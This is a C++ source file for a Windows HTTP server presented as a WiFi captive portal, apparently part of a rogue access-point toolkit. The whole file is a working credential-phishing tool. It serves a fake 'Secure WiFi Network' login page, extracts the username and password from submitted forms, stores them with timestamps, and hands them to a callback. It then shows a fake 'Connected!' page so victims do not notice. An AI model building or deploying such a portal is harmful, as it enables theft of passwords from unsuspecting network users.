/**
 * @file CaptivePortal.cpp
 * @brief Captive portal HTTP server implementation
 */

#include "CaptivePortal.h"
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

class CaptivePortalImpl : public CaptivePortal {
private:
    SOCKET listenSocket;
    std::atomic<bool> isRunning;
    std::thread serverThread;
    int port;
    std::string ipAddress;
    std::string htmlContent;
    std::vector<Credential> credentials;
    std::mutex credMutex;
    CredentialCallback credentialCallback;
    LogCallback logCallback;

public:
    CaptivePortalImpl() : listenSocket(INVALID_SOCKET), isRunning(false), port(80) {}
    ~CaptivePortalImpl() { Stop(); WSACleanup(); }
    
    bool Start(const std::string& ip, int portNum = 80) override {
        if (isRunning) Stop();
        ipAddress = ip; port = portNum;
        
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return false;
        
        listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (listenSocket == INVALID_SOCKET) return false;
        
        int reuse = 1;
        setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse));
        
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
        
        if (bind(listenSocket, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR ||
            listen(listenSocket, SOMAXCONN) == SOCKET_ERROR) {
            closesocket(listenSocket);
            listenSocket = INVALID_SOCKET;
            return false;
        }
        
        isRunning = true;
        serverThread = std::thread(&CaptivePortalImpl::acceptClients, this);
        if (logCallback) logCallback("Captive portal started on " + ip + ":" + std::to_string(port));
        return true;
    }
    
    void Stop() override {
        if (!isRunning) return;
        isRunning = false;
        if (listenSocket != INVALID_SOCKET) {
            closesocket(listenSocket);
            listenSocket = INVALID_SOCKET;
        }
        if (serverThread.joinable()) serverThread.join();
        if (logCallback) logCallback("Captive portal stopped");
    }
    
    bool IsRunning() const override { return isRunning; }
    bool SetContent(const std::string& html) override { htmlContent = html; return true; }
    void SetCredentialCallback(CredentialCallback callback) override { credentialCallback = callback; }
    void SetLogCallback(LogCallback callback) override { logCallback = callback; }
    std::vector<Credential> GetCredentials() override { std::lock_guard<std::mutex> lock(credMutex); return credentials; }
    void ClearCredentials() override { std::lock_guard<std::mutex> lock(credMutex); credentials.clear(); }
    std::string GetIPAddress() const override { return ipAddress; }
    int GetPort() const override { return port; }

private:
    void acceptClients() {
        fd_set readSet;
        timeval timeout = {1, 0};
        
        while (isRunning) {
            FD_ZERO(&readSet);
            FD_SET(listenSocket, &readSet);
            if (select(0, &readSet, nullptr, nullptr, &timeout) > 0 && FD_ISSET(listenSocket, &readSet)) {
                sockaddr_in clientAddr;
                int addrLen = sizeof(clientAddr);
                SOCKET client = accept(listenSocket, (sockaddr*)&clientAddr, &addrLen);
                if (client != INVALID_SOCKET) handleClient(client);
            }
        }
    }
    
    void handleClient(SOCKET client) {
        char buffer[4096];
        int bytes = recv(client, buffer, sizeof(buffer)-1, 0);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            std::string request(buffer);
            
            std::string response;
            if (request.find("POST /login") != std::string::npos) {
                response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n";
                response += getSuccessPage();
                parsePostData(request);
            } else {
                response = "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nConnection: close\r\n\r\n";
                response += getCapturePage();
            }
            send(client, response.c_str(), (int)response.length(), 0);
        }
        closesocket(client);
    }
    
    void parsePostData(const std::string& request) {
        size_t pos = request.find("\r\n\r\n");
        if (pos == std::string::npos) return;
        std::string data = request.substr(pos + 4);
        
        std::string username, password;
        size_t u = data.find("username=");
        if (u != std::string::npos) {
            size_t e = data.find("&", u);
            username = data.substr(u + 9, (e == std::string::npos) ? std::string::npos : e - u - 9);
        }
        size_t p = data.find("password=");
        if (p != std::string::npos) {
            size_t e = data.find("&", p);
            password = data.substr(p + 9, (e == std::string::npos) ? std::string::npos : e - p - 9);
        }
        
        if (!username.empty() && !password.empty()) {
            Credential cred;
            cred.username = username;
            cred.password = password;
            cred.ssid = "CaptivePortal";
            cred.timestamp = std::chrono::system_clock::now();
            {
                std::lock_guard<std::mutex> lock(credMutex);
                credentials.push_back(cred);
            }
            if (credentialCallback) credentialCallback(cred);
        }
    }
    
    std::string getCapturePage() {
        if (!htmlContent.empty()) return htmlContent;
        return R"(<!DOCTYPE html><html><head><title>WiFi Login</title>
<style>body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.container{background:white;padding:40px;border-radius:10px;box-shadow:0 10px 40px rgba(0,0,0,0.3);width:350px;}
h1{color:#333;text-align:center;}
.logo{text-align:center;font-size:48px;}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:12px;background:#667eea;color:white;border:none;border-radius:4px;cursor:pointer;}
button:hover{background:#5a67d8;}
.footer{text-align:center;margin-top:20px;color:#888;font-size:12px;}
</style></head>
<body><div class="container"><div class="logo">🌐</div><h1>WiFi Login</h1>
<form action="/login" method="POST">
<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Connect</button></form>
<div class="footer">Secure WiFi Network</div></div></body></html>)";
    }
    
    std::string getSuccessPage() {
        return R"(<!DOCTYPE html><html><head><title>Connected</title>
<style>body{font-family:Arial;background:#48bb78;margin:0;padding:20px;display:flex;justify-content:center;align-items:center;min-height:100vh;}
.container{background:white;padding:40px;border-radius:10px;text-align:center;}
.check{font-size:64px;color:#48bb78;}
</style></head>
<body><div class="container"><div class="check">✅</div><h1>Connected!</h1><p>You are now connected.</p></div></body></html>)";
    }
};

// Factory function
std::unique_ptr<CaptivePortal> CreateCaptivePortal() {
    return std::make_unique<CaptivePortalImpl>();
}
